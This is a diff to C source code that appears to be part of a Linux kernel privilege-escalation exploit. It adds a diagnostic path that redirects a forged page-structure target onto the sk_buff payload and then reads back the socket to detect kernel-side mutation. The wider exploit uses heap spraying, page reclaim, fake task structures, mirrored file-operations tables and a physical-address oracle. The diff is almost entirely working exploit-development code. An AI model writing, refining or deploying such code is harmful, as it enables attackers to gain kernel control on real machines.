@@ -5,6 +5,10 @@ static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+static unsigned char *slide_self_expected;
+#endif
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -139,6 +143,12 @@ _Static_assert(
 _Static_assert(
     APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
     "mirrored FOPS table overlaps primary FOPS table");
+#endif
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+_Static_assert(
+    APP_SLIDE_SELF_TARGET_OFF + sizeof(uint64_t) <= ORDER3_SIZE,
+    "slide self-target exceeds reclaimed page");
 #endif
 #endif
 
@@ -670,6 +680,67 @@ int reclaim_receiver_fd(void) {
   return reclaim_sv[1];
 }
 
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+int read_slide_reclaim_self_target(void) {
+  if (reclaim_sv[1] < 0 || !slide_self_expected) {
+    pr_error("sk_buff self-target readback unavailable fd=%d expected=%d\n",
+             reclaim_sv[1], slide_self_expected != NULL);
+    return 0;
+  }
+
+  unsigned char *received = malloc(SKB_SEND_SIZE);
+  if (!received) {
+    pr_error("sk_buff self-target readback allocation failed\n");
+    return 0;
+  }
+
+  int flags = fcntl(reclaim_sv[1], F_GETFL, 0);
+  if (flags >= 0) {
+    fcntl(reclaim_sv[1], F_SETFL, flags | O_NONBLOCK);
+  }
+
+  const size_t expected_total =
+      (size_t)APP_SLIDE_RECLAIM_SENDS * SKB_SEND_SIZE;
+  size_t total = 0;
+  size_t changed = 0;
+  int saved_errno = 0;
+  while (total < expected_total) {
+    errno = 0;
+    ssize_t n = recv(reclaim_sv[1], received, SKB_SEND_SIZE, MSG_DONTWAIT);
+    if (n <= 0) {
+      saved_errno = errno;
+      break;
+    }
+    for (ssize_t i = 0; i < n; i++) {
+      size_t stream_off = total + (size_t)i;
+      size_t payload_off = stream_off % SKB_SEND_SIZE;
+      if (received[i] == slide_self_expected[payload_off]) {
+        continue;
+      }
+      if (changed == 0) {
+        pr_info("sk_buff self-target mutation stream=%zu send=%zu "
+                "payload_off=%04zx before=%02x after=%02x\n",
+                stream_off, stream_off / SKB_SEND_SIZE, payload_off,
+                slide_self_expected[payload_off], received[i]);
+      }
+      changed++;
+    }
+    total += (size_t)n;
+  }
+
+  pr_info("sk_buff self-target readback total=%zu/%zu sends=%zu "
+          "changed=%zu errno=%d\n",
+          total, expected_total, total / SKB_SEND_SIZE, changed,
+          saved_errno);
+  free(received);
+  free(slide_self_expected);
+  slide_self_expected = NULL;
+  close_reclaim_sockets();
+  return changed != 0;
+}
+#endif
+
 void close_ctx_memfds(struct mm_ctx *ctx) {
   for (size_t i = 0; i < ctx->mm_cnt; i++) {
     if (ctx->memfds[i] > 0) {
@@ -757,6 +828,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         uintptr_t parent;
         uintptr_t target;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+        if (slot == P0_ORACLE_GATE_SLOT) {
+          parent = direct_to_page(base);
+          target = payload_base + APP_SLIDE_SELF_TARGET_OFF;
+          p0_gate_page_struct = parent;
+        } else
+#endif
         if (slot == P0_ORACLE_GATE_SLOT) {
           parent = direct_to_page(base);
           target = pipebuf_page_base +
@@ -820,6 +899,15 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
       }
     }
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+    free(slide_self_expected);
+    slide_self_expected = malloc(SKB_SEND_SIZE);
+    if (!slide_self_expected) {
+      return 0;
+    }
+    memcpy(slide_self_expected, skb_buf, SKB_SEND_SIZE);
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     return select_slide_payload_index(P0_ORACLE_GATE_SLOT);
 #else
@@ -1037,6 +1125,11 @@ static void cleanup_failed_kernel_page(const char *reason) {
 #endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+#if defined(APP_SLIDE_SELF_TARGET_DIAGNOSTIC) && \
+    APP_SLIDE_SELF_TARGET_DIAGNOSTIC
+  free(slide_self_expected);
+  slide_self_expected = NULL;
+#endif
   close_reclaim_sockets();
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
